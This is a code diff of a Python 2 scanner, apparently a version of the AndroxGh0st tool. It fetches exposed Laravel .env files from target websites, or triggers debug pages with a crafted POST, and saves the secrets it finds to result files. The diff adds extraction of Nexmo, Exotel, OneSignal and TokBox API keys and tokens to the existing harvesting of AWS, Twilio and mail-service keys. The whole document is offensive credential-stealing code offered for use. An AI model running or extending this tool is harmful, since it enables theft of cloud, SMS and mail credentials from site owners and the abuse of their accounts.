@@ -144,11 +144,60 @@ def AWS_KEY():
     AWS_KEY = "off"
     return AWS_KEY
 
+def NEXMO():
+
+  Targetssaaa = "settings.ini" #for date
+  ip_listx = open(Targetssaaa, 'r').read()
+
+  if "NEXMO=on" in ip_listx:
+    NEXMO = "on"
+    return NEXMO
+  else:
+    NEXMO = "off"
+    return NEXMO
+
+def EXOTEL():
+
+  Targetssaaa = "settings.ini" #for date
+  ip_listx = open(Targetssaaa, 'r').read()
+
+  if "EXOTEL=on" in ip_listx:
+    EXOTEL = "on"
+    return EXOTEL
+  else:
+    EXOTEL = "off"
+    return EXOTEL
+def ONESIGNAL():
+
+  Targetssaaa = "settings.ini" #for date
+  ip_listx = open(Targetssaaa, 'r').read()
+
+  if "ONESIGNAL=on" in ip_listx:
+    ONESIGNAL = "on"
+    return ONESIGNAL
+  else:
+    ONESIGNAL = "off"
+    return ONESIGNAL
+
+def TOKBOX():
+
+  Targetssaaa = "settings.ini" #for date
+  ip_listx = open(Targetssaaa, 'r').read()
+
+  if "TOKBOX=on" in ip_listx:
+    TOKBOX = "on"
+    return TOKBOX
+  else:
+    TOKBOX = "off"
+    return TOKBOX
+
+
+
 
 def prepare(sites):
 
     try:
-      meki = requests.get(sites+'/.env',headers=Headers,timeout=5)
+      meki = requests.get(sites+'/.env',headers=Headers,timeout=8)
       if 'DB_PASSWORD=' in meki.text:
         print "\033[1;40m[x] {} ===>   \033[1;32;40mSuccess".format(str(sites))
         open('config-'+year+month+day+'.txt', 'a').write("\n---------------Cannabis env-------------\n"+sites+"\n"+meki.text + '\n-----------------------------------------\n\n')
@@ -274,9 +323,137 @@ def get_smtp(url,text):
     else:
       print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed AWS_KEY".format(str(url))
 
+    if "NEXMO" in text and NEXMO() == "on":
+      if "NEXMO_KEY=" in text:
+        try:
+          nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
+        except:
+          nexmo_key = ''
+        try:
+          nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
+        except:
+          nexmo_secret = ''
+        try:
+          phone = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
+        except:
+          phone = ''
+        print "\033[1;40m[x] {} ===>   \033[1;32;40mNEXMO".format(str(url))
+        build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
+        remover = str(build).replace('\r', '')
+        save = open('Resultz/NEXMO.txt', 'a')
+        save.write(remover+'\n\n')
+        save.close()
+    elif 'NEXMO_KEY=' not in text or 'NEXMO_KEY=' in text and NEXMO() == "off":
+      pass
+    else:
+      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed NEXMO".format(str(url))
+    if "EXOTEL_API_KEY" in text and EXOTEL() == "on":
+      if "EXOTEL_API_KEY=" in text:
+        try:
+          exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
+        except:
+          exotel_api = ''
+        try:
+          exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
+        except:
+          exotel_token = ''
+        try:
+          exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
+        except:
+          exotel_sid = ''
+        print "\033[1;40m[x] {} ===>   \033[1;32;40mEXOTEL".format(str(url))
+        build = 'URL: '+str(url)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
+        remover = str(build).replace('\r', '')
+        save = open('Resultz/EXOTEL.txt', 'a')
+        save.write(remover+'\n\n')
+        save.close()
+    elif 'EXOTEL_API_KEY=' not in text or 'EXOTEL_API_KEY=' in text and EXOTEL() == "off":
+      pass
+    else:
+      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed EXOTEL".format(str(url))
+
+
+    if "ONESIGNAL_APP_ID" in text and ONESIGNAL() == "on":
+      if "ONESIGNAL_APP_ID=" in text:
+        try:
+          onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
+        except:
+          onesignal_id = ''
+        try:
+          onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
+        except:
+          onesignal_id = ''
+        try:
+          onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
+        except:
+          onesignal_auth = ''
+        print "\033[1;40m[x] {} ===>   \033[1;32;40mONESIGNAL".format(str(url))
+        build = 'URL: '+str(url)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
+        remover = str(build).replace('\r', '')
+        save = open('Resultz/ONESIGNAL.txt', 'a')
+        save.write(remover+'\n\n')
+        save.close()
+    elif 'ONESIGNAL_APP_ID=' not in text or 'ONESIGNAL_APP_ID=' in text and ONESIGNAL() == "off":
+      pass
+    else:
+      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed ONESIGNAL".format(str(url))
+
+    if "TOKBOX_KEY_DEV" in text and TOKBOX() == "on":
+      if "TOKBOX_KEY_DEV=" in text:
+        try:
+          tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
+        except:
+          tokbox_key = ''
+        try:
+          tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
+        except:
+          tokbox_secret = ''
+        print "\033[1;40m[x] {} ===>   \033[1;32;40mTOKBOX".format(str(url))
+        build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
+        remover = str(build).replace('\r', '')
+        save = open('Resultz/TOKBOX.txt', 'a')
+        save.write(remover+'\n\n')
+        save.close()
+    elif 'TOKBOX_KEY_DEV=' not in text or 'TOKBOX_KEY_DEV=' in text and TOKBOX() == "off":
+      pass
+    else:
+      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed TOKBOX".format(str(url))
+
+    if "TOKBOX_KEY" in text and TOKBOX() == "on":
+      if "TOKBOX_KEY=" in text:
+        try:
+          tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
+        except:
+          tokbox_key = ''
+        try:
+          tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
+        except:
+          tokbox_secret = ''
+        print "\033[1;40m[x] {} ===>   \033[1;32;40mTOKBOX".format(str(url))
+        build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
+        remover = str(build).replace('\r', '')
+        save = open('Resultz/TOKBOX.txt', 'a')
+        save.write(remover+'\n\n')
+        save.close()
+    elif 'TOKBOX_KEY_DEV=' not in text or 'TOKBOX_KEY_DEV=' in text and TOKBOX() == "off":
+      pass
+    else:
+      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed TOKBOX".format(str(url))
+
+
+
 
   except Exception as e:
     pass
+
+
+
+
+
+
+
+
+
 def get_smtp2(url,text):
   try:
     if "MAIL_HOST" in text:
@@ -360,6 +537,119 @@ def get_smtp2(url,text):
       save.close()
     else:
       print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed Twillio".format(str(url))
+    if '<td>NEXMO_KEY</td>' in text and NEXMO() == "on":
+
+      try:
+        nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        nexmo_key = ''
+      try:
+        nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        nexmo_secret = ''
+      try:
+        phone = reg('<td>EXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        phone = ''
+      print "\033[1;40m[x] {} ===>   \033[1;32;40mNEXMO".format(str(url))
+      build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
+      remover = str(build).replace('\r', '')
+      save = open('Resultz/NEXMO.txt', 'a')
+      save.write(remover+'\n\n')
+      save.close()
+    elif 'NEXMO_KEY' not in text or 'NEXMO_KEY' in text and NEXMO() == "off":
+      pass
+    else:
+      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed NEXMO".format(str(url))
+
+
+    if '<td>EXOTEL_API_KEY</td>' in text and EXOTEL() == "on":
+      try:
+        exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        exotel_api = ''
+      try:
+        exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        exotel_token = ''
+      try:
+        exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        exotel_sid = ''
+      print "\033[1;40m[x] {} ===>   \033[1;32;40mEXOTEL".format(str(url))
+      build = 'URL: '+str(url)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
+      remover = str(build).replace('\r', '')
+      save = open('Resultz/EXOTEL.txt', 'a')
+      save.write(remover+'\n\n')
+      save.close()
+    elif 'EXOTEL_API_KEY' not in text or 'EXOTEL_API_KEY' in text and EXOTEL() == "off":
+      pass
+    else:
+      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed EXOTEL".format(str(url))
+
+
+    if '<td>ONESIGNAL_APP_ID</td>' in text and ONESIGNAL() == "on":
+      try:
+        onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        onesignal_id = ''
+      try:
+        onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        onesignal_token = ''
+      try:
+        onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        onesignal_auth = ''
+      print "\033[1;40m[x] {} ===>   \033[1;32;40mONESIGNAL".format(str(url))
+      build = 'URL: '+str(url)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
+      remover = str(build).replace('\r', '')
+      save = open('Resultz/ONESIGNAL.txt', 'a')
+      save.write(remover+'\n\n')
+      save.close()
+    elif 'ONESIGNAL_APP_ID' not in text or 'ONESIGNAL_APP_ID' in text and ONESIGNAL() == "off":
+      pass
+    else:
+      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed ONESIGNAL".format(str(url))
+    if '<td>TOKBOX_KEY_DEV</td>' in text and TOKBOX() == "on":
+      try:
+        tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        tokbox_key = ''
+      try:
+        tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        tokbox_secret = ''
+      print "\033[1;40m[x] {} ===>   \033[1;32;40mTOKBOX".format(str(url))
+      build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
+      remover = str(build).replace('\r', '')
+      save = open('Resultz/TOKBOX.txt', 'a')
+      save.write(remover+'\n\n')
+      save.close()
+    elif 'TOKBOX_KEY_DEV' not in text or 'TOKBOX_KEY_DEV' in text and TOKBOX() == "off":
+      pass
+    else:
+      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed TOKBOX".format(str(url))
+    if '<td>TOKBOX_KEY</td>' in text:
+      try:
+        tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        tokbox_key = ''
+      try:
+        tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+      except:
+        tokbox_secret = ''
+      print "\033[1;40m[x] {} ===>   \033[1;32;40mTOKBOX".format(str(url))
+      build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
+      remover = str(build).replace('\r', '')
+      save = open('Resultz/TOKBOX.txt', 'a')
+      save.write(remover+'\n\n')
+      save.close()
+    elif 'TOKBOX_KEY_DEV' not in text or 'TOKBOX_KEY_DEV' in text and TOKBOX() == "off":
+      pass
+    else:
+      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed TOKBOX".format(str(url))
+
 
   except Exception as e:
     pass
@@ -369,11 +659,11 @@ def di_chckngntd(url):
   try:
     text = '\033[32;1m#\033[0m '+url
     headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
-    get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
+    get_source = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
     if "APP_KEY=" in str(get_source):
       get_smtp(url+"/.env",str(get_source))
     else:
-      get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
+      get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
       if "<td>APP_KEY</td>" in get_source:
         get_smtp2(url,get_source)
       else:
@@ -400,8 +690,11 @@ def checkset():
   sendgridx = sendgrid()
   office365x = office365()
   mailgunx = mailgun()
-
-  print "amazonaws:"+awsx+"|twillio:"+twilliox+"|AWS_KEY:"+AWS_KEYx+"|AWS_ACCESS_KEY:"+AWS_ACCESS_KEYx+"|sparkpostmail:"+sparkpostmailx+"\n1and1:"+and1x+"|mandrillapp:"+mandrillappx+"|zoho:"+zohox+"|sendgrid:"+sendgridx+"|office365:"+office365x+"|mailgun:"+mailgunx
+  NEXMOx=NEXMO()
+  EXOTELx=EXOTEL()
+  ONESIGNALx=ONESIGNAL()
+  TOKBOXx=TOKBOX()
+  print "amazonaws:"+awsx+"|twillio:"+twilliox+"|AWS_KEY:"+AWS_KEYx+"|AWS_ACCESS_KEY:"+AWS_ACCESS_KEYx+"|sparkpostmail:"+sparkpostmailx+"\n1and1:"+and1x+"|mandrillapp:"+mandrillappx+"|zoho:"+zohox+"|sendgrid:"+sendgridx+"|office365:"+office365x+"|mailgun:"+mailgunx+"\n|NEXMO:"+NEXMOx+"|EXOTEL:"+EXOTELx+"|ONESIGNAL:"+ONESIGNALx+"|TOKBOX:"+TOKBOXx
 
 def logo():
     clear = "\x1b[0m"
